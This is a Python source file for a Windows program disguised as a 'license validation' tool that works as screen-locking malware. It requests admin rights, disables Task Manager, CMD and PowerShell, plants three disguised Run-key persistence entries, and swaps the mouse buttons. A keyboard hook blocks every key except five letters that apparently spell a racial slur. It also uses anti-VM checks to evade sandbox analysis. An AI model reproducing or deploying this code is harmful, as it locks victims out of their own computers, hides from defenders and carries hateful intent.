import os
import sys
import ctypes
import subprocess
import requests
import uuid
import winreg
import time
import random
import threading
import tkinter as tk
from pathlib import Path
from ctypes import wintypes

# --- WINDOWS API SETUP ---
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
    ]

class YouTubeEliteGuard:
    def __init__(self):
        self.authorized_ip = "146.70.124.148"
        self.vm_score = 0
        self.persistence_names = ["WinSecurityHealth", "SystemDisplayBroker", "WinUpdateManager"]
        self.hook = None

    def is_admin(self):
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

    def request_admin(self):
        if not self.is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()

    def get_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except: return "0.0.0.0"

    def apply_lockdown(self):
        """Silently disables system tools and sets 3x persistence."""
        try:
            # Registry Paths
            policies_system = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            policies_cmd = r"SOFTWARE\Policies\Microsoft\Windows\System"
            policies_explorer = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            run_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

            # 1. Disable Task Manager, CMD, PowerShell (All Users)
            for hkey in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                # TaskMgr
                with winreg.CreateKey(hkey, policies_system) as k:
                    winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                # CMD
                with winreg.CreateKey(hkey, policies_cmd) as k:
                    winreg.SetValueEx(k, "DisableCMD", 0, winreg.REG_DWORD, 1)
                # PowerShell
                with winreg.CreateKey(hkey, policies_explorer) as k:
                    winreg.SetValueEx(k, "DisallowRun", 0, winreg.REG_DWORD, 1)
                    with winreg.CreateKey(k, "DisallowRun") as dr:
                        winreg.SetValueEx(dr, "1", 0, winreg.REG_SZ, "powershell.exe")
                        winreg.SetValueEx(dr, "2", 0, winreg.REG_SZ, "pwsh.exe")

            # 2. 3x Persistence
            exe_path = os.path.realpath(sys.executable)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, run_key, 0, winreg.KEY_SET_VALUE) as k:
                for name in self.persistence_names:
                    winreg.SetValueEx(k, name, 0, winreg.REG_SZ, exe_path)
        except Exception as e: pass

    def kbd_callback(self, nCode, wParam, lParam):
        """Keyboard Whitelist: Only n, g, i, r, e."""
        if nCode == 0 and wParam == WM_KEYDOWN:
            vk = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode
            # Key Codes: N(4E), G(47), I(49), R(52), E(45)
            if vk not in [0x4E, 0x47, 0x49, 0x52, 0x45]:
                return 1 # Block key
        return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)

    def start_input_manipulation(self):
        # Swap Mouse Buttons
        user32.SwapMouseButton(True)
        # Set Keyboard Hook
        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        self.pointer = CMPFUNC(self.kbd_callback)
        self.hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
        
        # Message pump for the hook to stay alive
        def pump():
            msg = wintypes.MSG()
            while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
        threading.Thread(target=pump, daemon=True).start()

    def show_gui(self):
        """Professional License Validation GUI."""
        def launch():
            root = tk.Tk()
            root.overrideredirect(True)
            root.attributes("-topmost", True)
            root.configure(bg='#121212')
            
            w, h = 480, 200
            x = (root.winfo_screenwidth() // 2) - (w // 2)
            y = (root.winfo_screenheight() // 2) - (h // 2)
            root.geometry(f"{w}x{h}+{x}+{y}")
            
            tk.Label(root, text="VALIDATING LICENSE KEY...", 
                     fg="#00FF41", bg="#121212", 
                     font=("Consolas", 18, "bold")).pack(expand=True)
            root.mainloop()
        
        threading.Thread(target=launch, daemon=True).start()

    def run_anti_vm(self):
        # Weighted Scoring System
        try:
            # Check BIOS
            cmd = "wmic bios get serialnumber"
            res = subprocess.check_output(cmd, shell=True, creationflags=0x08000000).decode().lower()
            if any(x in res for x in ["0", "vmware", "vbox", "qemu"]): self.vm_score += 3
            
            # Check RAM
            import psutil
            if psutil.virtual_memory().total / (1024**3) < 4: self.vm_score += 1
        except: pass

        curr_ip = self.get_ip()
        is_vm = self.vm_score >= 3

        if not is_vm:
            # PHYSICAL MACHINE: LOCKDOWN
            self.apply_lockdown()
            self.start_input_manipulation()
            self.show_gui()
            return True
        else:
            # VM: CHECK IP
            if curr_ip == self.authorized_ip:
                self.show_gui()
                return True
            else:
                sys.exit()

if __name__ == "__main__":
    guard = YouTubeEliteGuard()
    guard.request_admin()
    if guard.run_anti_vm():
        # Keep background threads alive
        while True:
            time.sleep(10)